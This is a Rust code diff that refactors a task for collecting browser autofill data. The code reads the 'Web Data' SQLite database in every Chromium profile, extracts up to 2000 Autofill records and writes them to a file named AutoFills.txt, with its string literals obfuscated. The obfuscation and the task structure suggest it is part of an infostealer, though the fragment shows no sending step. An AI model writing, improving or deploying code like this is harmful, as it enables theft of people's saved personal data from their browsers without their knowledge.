@@ -6,7 +6,7 @@ use alloc::sync::Arc;
 use alloc::vec::Vec;
 use tasks::{parent_name, Task};
 use utils::path::{Path, WriteToFile};
-use crate::AutoFill;
+use crate::{collect_from_all_profiles, read_sqlite3_and_map_records, to_string_and_write_all, AutoFill};
 use crate::chromium::Browser;
 use obfstr::obfstr as s;
 use sqlite::read_sqlite3_database_by_bytes;
@@ -29,44 +29,20 @@ impl Task for AutoFillTask {
     parent_name!("AutoFills.txt");
     
     unsafe fn run(&self, parent: &Path) {
-        let mut autofills: Vec<AutoFill> = self.browser
-            .profiles
-            .iter()
-            .filter_map(|profile| get_autofills(profile))
-            .flat_map(|v| v.into_iter())
-            .collect();
-        
-        if autofills.is_empty() {
+        let Some(mut autofills) = collect_from_all_profiles(&self.browser.profiles, get_autofills) else {
             return
-        }
-        
-        autofills.sort();
-        autofills.dedup();
+        };
 
         autofills.sort_by(|a, b| b.last_used.cmp(&a.last_used));
         autofills.truncate(2000);
 
-        let _ = autofills
-            .iter()
-            .map(|autofill| autofill.to_string())
-            .collect::<Vec<String>>()
-            .join("\n\n")
-            .write_to(parent);
+        let _ = to_string_and_write_all(&autofills, "\n\n", parent);
     }
 }
 
 fn get_autofills(profile: &Path) -> Option<Vec<AutoFill>> {
-    let cookies_path = profile / s!("Web Data");
-    let bytes = cookies_path.read_file().ok()?;
-
-    let db = read_sqlite3_database_by_bytes(&bytes)?;
-    let table = db.read_table(s!("Autofill"))?;
-    
-    let autofills = table
-        .filter_map(|record| extract_autofill_from_record(&record))
-        .collect();
-    
-    Some(autofills)
+    let web_data_path = profile / s!("Web Data");
+    read_sqlite3_and_map_records(&web_data_path, s!("Autofill"), extract_autofill_from_record)
 }
 
 fn extract_autofill_from_record(record: &Box<dyn TableRecord>) -> Option<AutoFill> {
